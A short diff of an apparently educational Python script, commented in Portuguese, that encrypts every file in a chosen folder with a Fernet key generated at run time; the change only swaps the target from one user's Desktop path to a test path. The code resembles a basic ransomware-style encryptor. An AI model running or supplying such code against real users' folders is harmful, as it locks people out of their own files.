@@ -23,7 +23,7 @@ def encrypt_directory(directory, key):
             the_file.write(contents_encrypted)
 
 # Defina o diretório a ser criptografado
-directory_to_encrypt = "C:/Users/Wellinton/Desktop" #define aqui o caminho da pasta que deseja criptografar
+directory_to_encrypt = "C:/Users/teste/Desktop" #define aqui o caminho da pasta que deseja criptografar
 
 # Gerar a chave de descriptografia dos arquivos
 key = Fernet.generate_key()
